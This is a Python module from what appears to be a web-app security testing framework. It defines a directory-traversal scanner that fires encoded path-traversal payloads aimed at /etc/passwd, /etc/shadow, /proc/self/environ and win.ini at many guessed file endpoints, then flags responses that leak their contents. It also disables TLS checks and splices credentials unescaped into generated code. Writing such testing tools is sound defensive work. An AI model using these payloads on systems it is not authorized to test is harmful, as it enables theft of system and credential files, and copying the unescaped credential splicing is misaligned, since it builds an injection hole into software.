"""Directory traversal testing tool."""

from workers.authorization.base_tool import AuthorizationTool
from workers.authorization.concurrency import WeightClass


class DirectoryTraversalTester(AuthorizationTool):
    """Test directory traversal/file include vulnerabilities (WSTG-AUTHZ-001)."""

    name = "directory_traversal_tester"
    weight_class = WeightClass.HEAVY

    def build_command(self, target, credentials=None):
        target_url = getattr(target, 'target_value', str(target))
        base_url = target_url if target_url.startswith(('http://', 'https://')) else f"https://{target_url}"

        cred_json = "None"
        if credentials:
            import json as _j
            cred_json = _j.dumps(credentials)

        script = f'''
import httpx
import json
import sys

results = []
base_url = "{base_url}"
credentials = json.loads('{cred_json}') if '{cred_json}' != "None" else None

path_traversal_payloads = [
    "../../etc/passwd",
    "..\\\\..\\\\windows\\\\win.ini",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "../../etc/passwd%00",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%5c..%5c..%5cetc%5cpasswd",
    "%2e%2e%5c%2e%2e%5cetc%5cpasswd",
    "..%255c..%255c..%255cetc%255cpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "C:\\\\Windows\\\\win.ini",
    "C:\\\\boot.ini",
    "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts",
]

endpoints = [
    "/static/{{payload}}",
    "/assets/{{payload}}",
    "/download?file={{payload}}",
    "/file?path={{payload}}",
    "/path={{payload}}",
    "/include?page={{payload}}",
    "/load?doc={{payload}}",
    "/read?file={{payload}}",
    "/view?file={{payload}}",
    "/get?file={{payload}}",
    "/fetch?file={{payload}}",
    "/open?file={{payload}}",
    "/show?file={{payload}}",
    "/content?file={{payload}}",
    "/document?file={{payload}}",
    "/img={{payload}}",
    "/image={{payload}}",
    "/page={{payload}}",
    "/template={{payload}}",
    "/src={{payload}}",
]

headers = {{"User-Agent": "WebAppBH-Authorization-Tester"}}
if credentials and credentials.get("token"):
    headers["Authorization"] = "Bearer " + credentials["token"]

unix_indicators = [
    ("root:", "critical", "etc/passwd content detected"),
    ("/bin/bash", "critical", "shell path detected in response"),
    ("/bin/sh", "high", "shell path detected in response"),
    ("daemon:", "high", "etc/passwd daemon entry detected"),
    ("nobody:", "medium", "etc/passwd nobody entry detected"),
    ("[extensions]", "high", "win.ini [extensions] section detected"),
    ("boot loader", "high", "boot.ini content detected"),
    ("fonts", "medium", "win.ini fonts section detected"),
    ("passwd", "medium", "passwd keyword in response"),
    ("shadow", "medium", "shadow keyword in response"),
]

try:
    client = httpx.Client(follow_redirects=True, timeout=10, verify=False)

    for endpoint_template in endpoints:
        for payload in path_traversal_payloads:
            url = base_url + endpoint_template.format(payload=payload)
            try:
                resp = client.get(url, headers=headers)

                severity_found = None
                matched_indicator = None
                for indicator, sev, desc in unix_indicators:
                    if indicator in resp.text:
                        severity_found = sev
                        matched_indicator = desc
                        break

                if severity_found:
                    results.append({{
                        "title": "Directory traversal vulnerability",
                        "description": f"Path traversal payload returned sensitive content from {{url}}",
                        "severity": severity_found,
                        "data": {{
                            "url": url,
                            "payload": payload,
                            "indicator": matched_indicator,
                            "status_code": resp.status_code,
                            "content_length": len(resp.text),
                            "content_preview": resp.text[:200]
                        }}
                    }})

                elif resp.status_code == 200 and len(resp.text) > 100:
                    results.append({{
                        "title": "Potential directory traversal - non-404 response",
                        "description": f"Request to {{url}} returned 200 with {{len(resp.text)}} bytes",
                        "severity": "low",
                        "data": {{
                            "url": url,
                            "payload": payload,
                            "status_code": resp.status_code,
                            "content_length": len(resp.text)
                        }}
                    }})

            except httpx.RequestError:
                pass
            except Exception:
                pass

    client.close()

except Exception as e:
    results.append({{
        "title": "Directory traversal test error",
        "description": str(e),
        "severity": "info",
        "data": {{"error": str(e)}}
    }})

print(json.dumps(results))
'''
        return ["python3", "-c", script]

    def parse_output(self, stdout):
        import json
        try:
            return json.loads(stdout.strip())
        except (json.JSONDecodeError, ValueError):
            return []
